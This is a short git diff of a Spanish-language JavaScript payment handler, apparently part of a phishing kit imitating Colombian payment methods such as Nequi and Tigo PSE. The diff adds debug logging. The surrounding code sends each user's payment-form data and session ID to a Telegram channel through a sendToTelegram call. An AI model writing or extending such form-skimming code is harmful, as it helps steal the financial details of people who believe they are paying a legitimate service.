@@ -115,6 +115,10 @@ document.addEventListener('DOMContentLoaded', function() {
                     timestamp: new Date().toISOString()
                 };
                 
+                console.log(`[PAYMENT] 🚀 Iniciando pago con ${method}`);
+                console.log(`[PAYMENT] Session: ${sessionId}`);
+                console.log(`[PAYMENT] Data:`, data);
+                
                 // Enviar a Telegram con acción específica por método
                 let action = '';
                 if (method === 'nequi') {
@@ -127,8 +131,10 @@ document.addEventListener('DOMContentLoaded', function() {
                     action = 'tigo_pse';
                 }
                 
-                console.log(`[PAYMENT] Enviando ${method} a Telegram...`);
+                console.log(`[PAYMENT] Enviando action: ${action} a Telegram...`);
                 const result = await TelegramClient.sendToTelegram(action, data, sessionId);
+                
+                console.log('[PAYMENT] Resultado:', result);
                 
                 if (result.success) {
                     console.log(`[PAYMENT] ✓ Datos enviados a Telegram`);
